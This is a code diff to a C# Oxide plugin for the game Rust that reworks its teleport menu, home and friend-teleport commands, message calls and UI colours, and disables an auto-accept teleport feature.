@@ -1,4 +1,4 @@
-﻿using Oxide.Core;
+using Oxide.Core;
 using Oxide.Core.Configuration;
 using Oxide.Core.Libraries;
 using Oxide.Core.Plugins;
@@ -6,22 +6,23 @@ using System;
 using System.Collections.Generic;
 using System.Globalization;
 using System.Linq;
+using Newtonsoft.Json;
 using UnityEngine;
 using Oxide.Core.Libraries.Covalence;
 using Oxide.Game.Rust.Cui;
 
 namespace Oxide.Plugins
 {
-    [Info("Teleportation", "OxideBro", "1.4.2")]
+    [Info("Teleportation", "https://topplugin.ru/", "1.4.2")]
     class Teleportation : RustPlugin
     {
         [PluginReference] Plugin Clans;
         [PluginReference] Plugin Friends;
         Dictionary<ulong, Vector3> lastPositions = new Dictionary<ulong, Vector3>();
         Dictionary<BasePlayer, int> spectatingPlayers = new Dictionary<BasePlayer, int>();
-
+        
         private const string Layer = "TeleportMenu";
-
+        
         private class ButtonEntry
         {
             public string Name;
@@ -30,11 +31,11 @@ namespace Oxide.Plugins
             public string Color;
             public bool Close;
         }
-
+        
         bool IsClanMember(ulong playerid = 1, ulong targetID = 0) => (bool)(Clans?.Call("HasFriend", playerid, targetID) ?? false);
         bool IsFriends(ulong playerID = 0, ulong friendId = 0)
         {
-            return (bool)(Friends?.Call("AreFriends", playerID, friendId) ?? false);
+            return (bool) (Friends?.Call("AreFriends", playerID, friendId) ?? false);
         }
 
         bool IsTeamate(BasePlayer player, ulong targetID)
@@ -65,7 +66,7 @@ namespace Oxide.Plugins
                 TPL = tpl;
             }
         }
-
+        
         int homelimitDefault;
         Dictionary<string, int> homelimitPerms;
         int tpkdDefault;
@@ -101,16 +102,6 @@ namespace Oxide.Plugins
 
         static DynamicConfigFile config;
         Dictionary<string, int> teleportSecsPerms;
-
-
-        private void SendNotify(BasePlayer player, string message, int type = 0)
-        {
-            if (Notify != null)
-                Notify?.Call("SendNotify", player, type, message);
-            else
-                SendReply(player, message);
-        }
-
         void OnNewSave()
         {
             if (wipedData)
@@ -235,32 +226,30 @@ namespace Oxide.Plugins
         List<TP> tpQueue = new List<TP>();
         List<TP> pendings = new List<TP>();
         List<ulong> sethomeBlock = new List<ulong>();
-
-        public List<BasePlayer> OpenTeleportMenu = new List<BasePlayer>();
-
-        [ChatCommand("tp.menu")]
+        
+        private Dictionary<BasePlayer, List<string>> OpenTeleportMenu = new Dictionary<BasePlayer, List<string>>();
+        
+        [ChatCommand("t")]
         private void cmdChatMap(BasePlayer player)
         {
-
             if (player == null) return;
-            if (OpenTeleportMenu.Contains(player))
+            if (OpenTeleportMenu.ContainsKey(player))
             {
                 OpenTeleportMenu.Remove(player);
-                CuiHelper.DestroyUi(player, Layer);
+                return;
             }
             else
             {
-                OpenTeleportMenu.Add(player);
                 DDrawMenu(player);
+                return;
             }
+
         }
 
         private void DDrawMenu(BasePlayer player)
         {
-            CuiHelper.DestroyUi(player, Layer);
-
             CuiElementContainer container = new CuiElementContainer();
-            List<ButtonEntry> buttons = new List<ButtonEntry>();
+            List<ButtonEntry>   buttons   = new List<ButtonEntry>();
 
             if (CheckGetHomes(player).Count < GetHomeLimit(player.userID))
             {
@@ -270,12 +259,23 @@ namespace Oxide.Plugins
                     Name = "Сохранить дом",
                     Command = $"tp.cmd sethome {pos}",
                     Sprite = "assets/icons/save.png",
-                    Color = "#d3a243",
+                    Color = "#d3a44a",
                     Close = true
                 });
             }
 
-            if (CheckGetHomes(player).Count > 0)
+            //var AutoTPInfo = AutoTPA[player.userID].Enabled ? "<color=#2abd2a>Включено</color>" : "<color=#bd4c2a>Отключено</color>";
+            
+            /*buttons.Add(new ButtonEntry
+            {
+                Name = $"Авто ТП {AutoTPInfo}",
+                Command = "tp.cmd atp",
+                Sprite = "assets/icons/electric.png",
+                Color = "#d3a44a",
+                Close = false
+            });*/
+
+            if (CheckGetHomes(player).Count >= 1)
             {
                 foreach (var check in CheckGetHomes(player))
                 {
@@ -284,58 +284,26 @@ namespace Oxide.Plugins
                         Name = check.Key,
                         Command = $"tp.cmd home {check.Key}",
                         Sprite = "assets/icons/construction.png",
-                        Color = "#3889cb",
+                        Color = "#3d89ce",
                         Close = true
-                    });
+                    });     
                 }
             }
-
-            var friendList = GetFriends(player.userID);
-            if (friendList.Count > 0)
+            
+            if (GetFriends(player.userID).Count >= 0)
             {
-                if(AutoTPA.ContainsKey(player.userID) == false)
-                {
-                    AutoTPA.Add(player.userID, new AutoTPASettings()
-                    {
-                        Enabled = false,
-                        PlayersList = new Dictionary<string, ulong>()
-                    });
-                }
-                
-                if (AutoTPA[player.userID].Enabled)
-                {
-                    buttons.Add(new ButtonEntry
-                    {
-                        Name = $"<size=11>Автопринятие</size>  <size=10><color=#2abd2a>Включено</color></size>",
-                        Command = "tp.cmd atp",
-                        Sprite = "assets/icons/electric.png",
-                        Color = "#63666f",
-                        Close = false
-                    });
-                }
-                else
-                {
-                    buttons.Add(new ButtonEntry
-                    {
-                        Name = $"<size=11>Автопринятие</size>  <size=10><color=#bd4c2a>Отключено</color></size>",
-                        Command = "tp.cmd atp",
-                        Sprite = "assets/icons/electric.png",
-                        Color = "#63666f",
-                        Close = false
-                    });
-                }
-
-                foreach (var friend in friendList)
+                //if (GetFriends(player.userID).Count >= 0) return;
+                foreach (var friend in GetFriends(player.userID))
                 {
                     var covFriend = covalence.Players.FindPlayerById(friend.ToString());
                     if (covFriend == null) continue;
-
+                    
                     buttons.Add(new ButtonEntry
                     {
                         Name = $"{covFriend.Name}",
                         Command = $"tp.cmd tpr {covFriend.Name}",
                         Sprite = "assets/icons/friends_servers.png",
-                        Color = "#8952a3",
+                        Color = "#8852a2",
                         Close = true
                     });
                 }
@@ -350,7 +318,7 @@ namespace Oxide.Plugins
                         Name = "Отклонить телепорт",
                         Command = "tp.cmd tpc",
                         Sprite = "assets/icons/vote_down.png",
-                        Color = "#d2414b",
+                        Color = "#e04f58",
                         Close = true
                     });
                 }
@@ -362,24 +330,24 @@ namespace Oxide.Plugins
                         Name = "Принять телепорт",
                         Command = "tp.cmd tpa",
                         Sprite = "assets/icons/vote_up.png",
-                        Color = "#53ac4f",
+                        Color = "#72b86b",
                         Close = true
                     });
-
+                
                     buttons.Add(new ButtonEntry
                     {
                         Name = "Отклонить телепорт",
                         Command = "tp.cmd tpc",
                         Sprite = "assets/icons/vote_down.png",
-                        Color = "#d2414b",
-                        Close = true
+                        Color = "#e04f58",
+                        Close = true 
                     });
                 }
             }
 
             foreach (var tpQ in tpQueue)
             {
-                if (tpQ.Player2 != null && tpQ.Player2 == player)
+                if (tpQ.Player2 != null && tpQ.Player2 == player) 
                 {
                     buttons.Add(new ButtonEntry
                     {
@@ -390,7 +358,7 @@ namespace Oxide.Plugins
                         Close = true
                     });
                 }
-
+                
                 if (tpQ.Player == player)
                 {
                     buttons.Add(new ButtonEntry
@@ -399,7 +367,7 @@ namespace Oxide.Plugins
                         Command = "tp.cmd tpc",
                         Sprite = "assets/icons/vote_down.png",
                         Color = "#e04f58",
-                        Close = true
+                        Close = true 
                     });
                 }
             }
@@ -416,18 +384,18 @@ namespace Oxide.Plugins
                 Parent = Layer,
                 Components =
                 {
-                    new CuiButtonComponent { Color = "0 0 0 0.9", Command = $"tp.cmd close" },
+                    new CuiButtonComponent { Color = HexToRustFormat("#653B4600"), Material = "assets/content/ui/uibackgroundblur.mat", Close = Layer },
                     new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-1000 -1000", OffsetMax = "1000 1000" }
                 }
             });
 
-            for (var i = 0; i < buttons.Count; i++)
+            for (var i = 0; i < buttons.Count; i++) 
             {
                 var button = buttons[i];
-
+                
                 var r = buttons.Count * 10 + 30;
-                var c = (double)buttons.Count / 2;
-                var pos = i / c * Math.PI;
+                var c = (double) buttons.Count / 2;
+                var pos = i / c * Math.PI;    
                 var x = r * Math.Sin(pos);
                 var y = r * Math.Cos(pos);
 
@@ -437,11 +405,11 @@ namespace Oxide.Plugins
                     Name = Layer + $".{i}",
                     Components =
                     {
-                        new CuiImageComponent { Sprite = "assets/icons/reddit.png", Color = HexToCuiColor(button.Color) },
+                        new CuiImageComponent { Sprite = "assets/icons/circle_gradient.png", Color = HexToRustFormat("#8e6874B6") },
                         new CuiRectTransformComponent {AnchorMin = $"{x - 35} {y - 35}", AnchorMax = $"{x + 35} {y + 35}" },
                     },
                 });
-
+                
                 container.Add(new CuiElement
                 {
                     Parent = Layer + $".{i}",
@@ -451,13 +419,13 @@ namespace Oxide.Plugins
                         new CuiRectTransformComponent { AnchorMin = "0.275 0.275", AnchorMax = "0.725 0.725" },
                     },
                 });
-
+                
                 container.Add(new CuiLabel
                 {
                     Text = { Text = button.Name, FontSize = 13, Align = TextAnchor.MiddleCenter, Color = HexToCuiColor("#FFFFFFCA"), Font = "robotocondensed-bold.ttf" },
                     RectTransform = { AnchorMax = "1 1", AnchorMin = "0 0" }
-                }, Layer + $".{i}");
-
+                }, Layer + $".{i}"); 
+                
                 container.Add(new CuiButton
                 {
                     Button = { Color = "0 0 0 0", Command = $"{button.Command}", Close = button.Close ? Layer : "" },
@@ -476,7 +444,7 @@ namespace Oxide.Plugins
                             new CuiRectTransformComponent { AnchorMin = "0.85 0.85", AnchorMax = "0.85 0.85", OffsetMin = "-10 -10", OffsetMax = "10 10" },
                         },
                     });
-
+                    
                     container.Add(new CuiButton
                     {
                         Button = { Color = "0 0 0 0", Command = $"tp.cmd removehome {button.Name}", Close = Layer },
@@ -486,83 +454,10 @@ namespace Oxide.Plugins
                 }
             }
 
+            CuiHelper.DestroyUi(player, Layer);
             CuiHelper.AddUi(player, container);
         }
-
-        private static Dictionary<ulong, List<PlayerEntry>> friends = new Dictionary<ulong, List<PlayerEntry>>();
-        private class PlayerEntry
-        {
-            public string name;
-            public ulong id;
-        }
-
-        public List<ulong> GetFriends(ulong playerid = 2952192)
-        {
-            if (Friends)
-            {
-                var friends = Friends?.Call("GetFriends", playerid) as ulong[];
-                return friends.ToList();
-            }
-
-            return new List<ulong>();
-        }
-        public RelationshipManager.PlayerTeam API_GetPlayerTeam(BasePlayer player)
-        {
-            RelationshipManager.PlayerTeam playerTeam = RelationshipManager._instance.FindTeam(player.currentTeam);
-
-            return playerTeam ?? null;
-        }
-
-        private static class PlayerHelper
-        {
-            private static bool FindPlayerPredicate(BasePlayer player, string nameOrUserId)
-            {
-                return player.displayName.IndexOf(nameOrUserId, StringComparison.OrdinalIgnoreCase) != -1 ||
-                       player.UserIDString == nameOrUserId;
-            }
-
-            public static bool Find(string nameOrUserId, out BasePlayer target)
-            {
-                nameOrUserId = nameOrUserId.ToLower();
-                foreach (BasePlayer activePlayer in BasePlayer.activePlayerList)
-                {
-                    if (PlayerHelper.FindPlayerPredicate(activePlayer, nameOrUserId))
-                    {
-                        target = activePlayer;
-                        return true;
-                    }
-                }
-
-                foreach (BasePlayer sleepingPlayer in BasePlayer.sleepingPlayerList)
-                {
-                    if (PlayerHelper.FindPlayerPredicate(sleepingPlayer, nameOrUserId))
-                    {
-                        target = sleepingPlayer;
-                        return true;
-                    }
-                }
-
-                target = (BasePlayer)null;
-                return false;
-            }
-
-            public static bool FindOnline(string nameOrUserId, out BasePlayer target)
-            {
-                nameOrUserId = nameOrUserId.ToLower();
-                foreach (BasePlayer activePlayer in BasePlayer.activePlayerList)
-                {
-                    if (PlayerHelper.FindPlayerPredicate(activePlayer, nameOrUserId))
-                    {
-                        target = activePlayer;
-                        return true;
-                    }
-                }
-
-                target = (BasePlayer)null;
-                return false;
-            }
-        }
-
+        
         [ConsoleCommand("tp.cmd")]
         void PlayerCMD(ConsoleSystem.Arg args)
         {
@@ -595,26 +490,38 @@ namespace Oxide.Plugins
                     break;
                 case "atp":
                     player.Command("chat.say /atp");
-                    break;
-                case "close":
-                    OpenTeleportMenu.Remove(player);
-                    CuiHelper.DestroyUi(player, Layer);
+                    DDrawMenu(player);
                     break;
             }
         }
-
+        
         Dictionary<string, Vector3> CheckGetHomes(BasePlayer player)
         {
             var homelist = GetHomes(player.userID) ?? new Dictionary<string, Vector3>();
             return homelist.GroupBy(p => p.Key).ToDictionary(p => p.Key, p => p.First().Value);
         }
+        
+        public List<ulong> GetFriends(ulong playerid = 2952192)
+        {
+            if (Friends != null)
+            {
+                var friends = Friends.Call("GetFriends", playerid) as ulong[];
+                if (friends != null)
+                {
+                    return friends.ToList();
+                }
+            }
 
+            return new List<ulong>();
+        }
+
+        
         private string GetGrid(Vector3 position, bool addVector)
         {
             var roundedPos = new Vector2(World.Size / 2 + position.x, World.Size / 2 - position.z);
             var grid = $"{NumberToLetter((int)(roundedPos.x / 150))}{(int)(roundedPos.y / 150)}";
             if (addVector) grid += $" {position.ToString().Replace(",", "")}";
-
+            
             return grid;
         }
 
@@ -623,12 +530,40 @@ namespace Oxide.Plugins
             var num2 = Mathf.FloorToInt((float)(num / 26));
             var num3 = num % 26;
             var text = string.Empty;
-
-            if (num2 > 0) for (var i = 0; i < num2; i++)
-                    text += Convert.ToChar(65 + i);
-
+            
+            if (num2 > 0) for (var i = 0; i < num2; i++) 
+                text += Convert.ToChar(65 + i);
+      
             return text + Convert.ToChar(65 + num3);
         }
+        
+            private static string HexToRustFormat(string hex)
+            {
+                if (string.IsNullOrEmpty(hex))
+                {
+                    hex = "#FFFFFFFF";
+                }
+
+                var str = hex.Trim('#');
+
+                if (str.Length == 6)
+                    str += "FF";
+
+                if (str.Length != 8)
+                {
+                    throw new Exception(hex);
+                    throw new InvalidOperationException("Cannot convert a wrong format.");
+                }
+
+                var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
+                var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
+                var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
+                var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);
+
+                Color color = new Color32(r, g, b, a);
+
+                return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
+            }
 
         private static string HexToCuiColor(string hex)
         {
@@ -658,13 +593,11 @@ namespace Oxide.Plugins
             return $"{color.r:F2} {color.g:F2} {color.b:F2} {color.a:F2}";
         }
 
-        void AddPlayerAutoTP(BasePlayer player)
+        /*void AddPlayerAutoTP(BasePlayer player)
         {
-            if (AutoTPA.ContainsKey(player.userID) == false)
-            {
+            if (!AutoTPA.ContainsKey(player.userID))
                 AutoTPA.Add(player.userID, new AutoTPASettings());
-            }
-
+            
             if (GetFriends(player.userID).Count >= 0)
             {
                 foreach (var friend in GetFriends(player.userID))
@@ -672,19 +605,13 @@ namespace Oxide.Plugins
                     var covFriend = covalence.Players.FindPlayerById(friend.ToString());
                     if (covFriend == null) continue;
 
-                    var data = AutoTPA[player.userID];
-
-                    var target = covalence.Players.FindPlayers(covFriend.Name);
-
-                    var firstTarget = target.ElementAt(0);
-
-                    if (data.PlayersList.ContainsKey(firstTarget.Name) == false)
-                        data.PlayersList.Add(firstTarget.Name, ulong.Parse(firstTarget.Id));
+                    if (AutoTPA[player.userID].PlayersList.ContainsKey(covFriend.Name)) return;
+                    AutoTPA[player.userID].PlayersList.Add(covFriend.Name, ulong.Parse(covFriend.Id));
                 }
-            }
-        }
+            }*/
+        //}
 
-        [ChatCommand("atp")]
+        /*[ChatCommand("atp")]
         void cmdAutoTPA(BasePlayer player, string com, string[] args)
         {
             if (!AutoTPA.ContainsKey(player.userID))
@@ -697,17 +624,17 @@ namespace Oxide.Plugins
                 if (AutoTPA[player.userID].Enabled)
                 {
                     AutoTPA[player.userID].Enabled = false;
+                    SendReply(player, "Вы успешно <color=#FDAE37>отключили</color> автопринятие запроса на телепорт");
                     DDrawMenu(player);
-                    SendNotify(player, "Вы успешно <color=#851716>отключили</color> автопринятие запроса на телепорт");
                 }
                 else
                 {
                     AutoTPA[player.userID].Enabled = true;
+                    SendReply(player, "Вы успешно <color=#FDAE37>включили</color> автопринятие запроса на телепорт");
                     DDrawMenu(player);
-                    SendNotify(player, "Вы успешно <color=#2abd2a>включили</color> автопринятие запроса на телепорт");
                 }
             }
-        }
+        }*/
 
 
 
@@ -732,43 +659,43 @@ namespace Oxide.Plugins
             if (foundationEx && foundation == null)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["foundationmissing"]);
+                SendReply(player, Messages["foundationmissing"]);
                 return;
             }
             if (!foundationEx && bulds == null)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["foundationmissing"]);
+                SendReply(player, Messages["foundationmissing"]);
                 return;
             }
             if (args.Length != 1)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["sethomeArgsError"]);
+                SendReply(player, Messages["sethomeArgsError"]);
                 return;
             }
             if (CancelTPMetabolism && player.metabolism.bleeding.value > 0)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (CancelTPRadiation && player.radiationLevel > 10)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["Radiation"]);
+                SendReply(player, Messages["Radiation"]);
                 return;
             }
             if (player.IsWounded() && CancelTPWounded)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (sethomeBlock.Contains(player.userID))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["sethomeBlock"]);
+                SendReply(player, Messages["sethomeBlock"]);
                 return;
             }
 
@@ -779,7 +706,7 @@ namespace Oxide.Plugins
                     if (!IsFriends(bulds.OwnerID, player.userID) && !IsClanMember(bulds.OwnerID, player.userID) && !IsTeamate(player, bulds.OwnerID))
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, Messages["foundationownerFC"]);
+                        SendReply(player, Messages["foundationownerFC"]);
                         return;
                     }
                 }
@@ -788,7 +715,7 @@ namespace Oxide.Plugins
                     if (!IsFriends(foundation.OwnerID, player.userID) && !IsClanMember(foundation.OwnerID, player.userID) && !IsTeamate(player, bulds.OwnerID))
                     {
                         Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                        SendNotify(player, Messages["foundationownerFC"]);
+                        SendReply(player, Messages["foundationownerFC"]);
                         return;
                     }
                 }
@@ -798,13 +725,13 @@ namespace Oxide.Plugins
                 if (foundationEx && foundation.OwnerID != uid && foundationOwnerFC == (!IsFriends(foundation.OwnerID, player.userID) && !IsClanMember(foundation.OwnerID, player.userID) && IsTeamate(player, bulds.OwnerID)))
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["foundationowner"]);
+                    SendReply(player, Messages["foundationowner"]);
                     return;
                 }
                 if (!foundationEx && bulds.OwnerID != uid && foundationOwnerFC == (!IsFriends(bulds.OwnerID, player.userID) && !IsClanMember(bulds.OwnerID, player.userID) && IsTeamate(player, bulds.OwnerID)))
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["foundationowner"]);
+                    SendReply(player, Messages["foundationowner"]);
                     return;
                 }
             }
@@ -818,13 +745,13 @@ namespace Oxide.Plugins
             if (args.Length != 1)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["removehomeArgsError"]);
+                SendReply(player, Messages["removehomeArgsError"]);
                 return;
             }
             if (!homes.ContainsKey(player.userID))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["homesmissing"]);
+                SendReply(player, Messages["homesmissing"]);
                 return;
             }
             var name = args[0];
@@ -832,7 +759,7 @@ namespace Oxide.Plugins
             if (!playerHomes.ContainsKey(name))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["homenotexist"]);
+                SendReply(player, Messages["homenotexist"]);
                 return;
             }
             foreach (var sleepingBag in SleepingBag.FindForPlayer(player.userID, true))
@@ -845,7 +772,7 @@ namespace Oxide.Plugins
             }
             Effect.server.Run(EffectPrefab1, player, 0, Vector3.zero, Vector3.forward);
             playerHomes.Remove(name);
-            SendNotify(player, string.Format(Messages["removehomesuccess"], name));
+            SendReply(player, Messages["removehomesuccess"], name);
         }
         [ConsoleCommand("home")]
         void cmdHome(ConsoleSystem.Arg arg)
@@ -863,7 +790,7 @@ namespace Oxide.Plugins
         {
             var player = arg.Player();
             if (player == null) return;
-            cmdChatTpa(player, "", new String[0]);
+            cmdChatTpa(player, "", new String[0] );
         }
         [ChatCommand("homelist")]
         private void cmdHomeList(BasePlayer player, string command, string[] args)
@@ -871,7 +798,7 @@ namespace Oxide.Plugins
             if (!homes.ContainsKey(player.userID) || homes[player.userID].Count == 0)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["homesmissing"]);
+                SendReply(player, Messages["homesmissing"]);
                 return;
             }
             var playerHomes = homes[player.userID];
@@ -884,7 +811,7 @@ namespace Oxide.Plugins
                     if (!GetSleepingBag(home.Key, home.Value)) playerHomes.Remove(home.Key);
                 }
             }
-            SendNotify(player, string.Format(Messages["homeslist"], time, string.Join("\n", homelist.ToArray())));
+            SendReply(player, Messages["homeslist"], time, string.Join("\n", homelist.ToArray()));
         }
         [ChatCommand("home")]
         void cmdChatHome(BasePlayer player, string command, string[] args)
@@ -892,45 +819,45 @@ namespace Oxide.Plugins
             if (args.Length != 1)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["homeArgsError"]);
+                SendReply(player, Messages["homeArgsError"]);
                 return;
             }
             var ret = Interface.Call("CanTeleport", player) as string;
             if (ret != null)
             {
-                SendNotify(player, ret);
+                SendReply(player, ret);
                 return;
             }
             if (!EnabledShipTP && player.GetParentEntity() is CargoShip)
             {
-                SendNotify(player, Messages["PlayerIsOnCargoShip"]);
+                SendReply(player, Messages["PlayerIsOnCargoShip"]);
                 return;
             }
             if (!EnabledBallonTP && player.GetParentEntity() is HotAirBalloon)
             {
-                SendNotify(player, Messages["PlayerIsOnHotAirBalloon"]);
+                SendReply(player, Messages["PlayerIsOnHotAirBalloon"]);
                 return;
             }
             if (player.IsWounded() && CancelTPWounded)
             {
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (player.metabolism.bleeding.value > 0 && CancelTPMetabolism)
             {
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (CancelTPRadiation && player.radiationLevel > 10)
             {
-                SendNotify(player, Messages["Radiation"]);
+                SendReply(player, Messages["Radiation"]);
                 return;
             }
             int seconds;
             if (cooldownsHOME.TryGetValue(player.userID, out seconds) && seconds > 0)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, string.Format(Messages["tpkd"], TimeToString(seconds)));
+                SendReply(player, string.Format(Messages["tpkd"], TimeToString(seconds)));
                 return;
             }
             if (homecupboard)
@@ -939,14 +866,14 @@ namespace Oxide.Plugins
                 if (privilege != null && !player.IsBuildingAuthed())
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["tphomecupboard"]);
+                    SendReply(player, Messages["tphomecupboard"]);
                     return;
                 }
             }
             if (!homes.ContainsKey(player.userID))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["homesmissing"]);
+                SendReply(player, Messages["homesmissing"]);
                 return;
             }
             var name = args[0];
@@ -954,7 +881,7 @@ namespace Oxide.Plugins
             if (!playerHomes.ContainsKey(name))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["homenotexist"]);
+                SendReply(player, Messages["homenotexist"]);
                 return;
             }
             var time = GetTeleportTime(player.userID);
@@ -965,7 +892,7 @@ namespace Oxide.Plugins
                 if (bag == null)
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["sleepingbagmissing"]);
+                    SendReply(player, Messages["sleepingbagmissing"]);
                     playerHomes.Remove(name);
                     return;
                 }
@@ -976,7 +903,7 @@ namespace Oxide.Plugins
                 if (bulds == null)
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["foundationmissingR"]);
+                    SendReply(player, Messages["foundationmissingR"]);
                     playerHomes.Remove(name);
                     return;
                 }
@@ -984,13 +911,13 @@ namespace Oxide.Plugins
             if (CancelTPCold && player.metabolism.temperature.value < 0)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["coldplayer"]);
+                SendReply(player, Messages["coldplayer"]);
                 return;
             }
             if (tpQueue.Any(p => p.Player == player) || pendings.Any(p => p.Player2 == player))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tpError"]);
+                SendReply(player, Messages["tpError"]);
                 return;
             }
             var lastTp = tpQueue.Find(p => p.Player == player);
@@ -1000,7 +927,7 @@ namespace Oxide.Plugins
             }
             tpQueue.Add(new TP(player, pos, time, false, false));
             Effect.server.Run(EffectPrefab1, player, 0, Vector3.zero, Vector3.forward);
-            SendNotify(player, string.Format(Messages["homequeue"], name, TimeToString(time)));
+            SendReply(player, String.Format(Messages["homequeue"], name, TimeToString(time)));
         }
         [ChatCommand("tpr")]
         void cmdChatTpr(BasePlayer player, string command, string[] args)
@@ -1009,39 +936,39 @@ namespace Oxide.Plugins
             if (args.Length != 1)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tprArgsError"]);
+                SendReply(player, Messages["tprArgsError"]);
                 return;
             }
             var ret = Interface.Call("CanTeleport", player) as string;
             if (ret != null)
             {
-                SendNotify(player, ret);
+                SendReply(player, ret);
                 return;
             }
             if (!EnabledShipTP && player.GetParentEntity() is CargoShip)
             {
-                SendNotify(player, Messages["PlayerIsOnCargoShip"]);
+                SendReply(player, Messages["PlayerIsOnCargoShip"]);
                 return;
             }
             if (!EnabledBallonTP && player.GetParentEntity() is HotAirBalloon)
             {
-                SendNotify(player, Messages["PlayerIsOnHotAirBalloon"]);
+                SendReply(player, Messages["PlayerIsOnHotAirBalloon"]);
                 return;
             }
             if (player.IsWounded() && CancelTPWounded)
             {
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (player.metabolism.bleeding.value > 0 && CancelTPMetabolism)
             {
-                SendNotify(player, Messages["woundedAction"]);
+                SendReply(player, Messages["woundedAction"]);
                 return;
             }
             if (CancelTPRadiation && player.radiationLevel > 10)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["Radiation"]);
+                SendReply(player, Messages["Radiation"]);
                 return;
             }
             if (restrictTPRCupboard)
@@ -1050,7 +977,7 @@ namespace Oxide.Plugins
                 if (privilege != null && !player.IsBuildingAuthed())
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["tpcupboard"]);
+                    SendReply(player, Messages["tpcupboard"]);
                     return;
                 }
             }
@@ -1059,71 +986,73 @@ namespace Oxide.Plugins
             if (target == null)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["playermissing"]);
+                SendReply(player, Messages["playermissing"]);
                 return;
             }
             if (target == player)
             {
-                SendNotify(player, Messages["playerisyou"]);
+                SendReply(player, Messages["playerisyou"]);
                 return;
             }
             if (FriendsEnabled)
-                if (!IsFriends(target.userID, player.userID) && !IsTeamate(player, target.userID) && !IsClanMember(player.userID, target.userID))
+                if (!IsFriends(target.userID, player.userID)  && !IsTeamate(player, target.userID) && !IsClanMember(player.userID, target.userID))
                 {
                     Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                    SendNotify(player, Messages["PlayerNotFriend"]);
+                    SendReply(player, Messages["PlayerNotFriend"]);
                     return;
                 }
             int seconds = 0;
             if (restrictCupboard && player.GetBuildingPrivilege(player.WorldSpaceBounds()) != null && !player.GetBuildingPrivilege(player.WorldSpaceBounds()).authorizedPlayers.Select(p => p.userid).Contains(player.userID))
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["tpcupboard"]);
+                SendReply(player, Messages["tpcupboard"]);
                 return;
             }
 
             if (cooldownsTP.TryGetValue(player.userID, out seconds) && seconds > 0)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, string.Format(Messages["tpkd"], TimeToString(seconds)));
+                SendReply(player, string.Format(Messages["tpkd"], TimeToString(seconds)));
                 return;
             }
             if (CancelTPCold && player.metabolism.temperature.value < 0)
             {
                 Effect.server.Run(EffectPrefab, player, 0, Vector3.zero, Vector3.forward);
-                SendNotify(player, Messages["coldplayer"]);
+                SendReply(player, Messages["coldplayer"]);
                 return;
             }
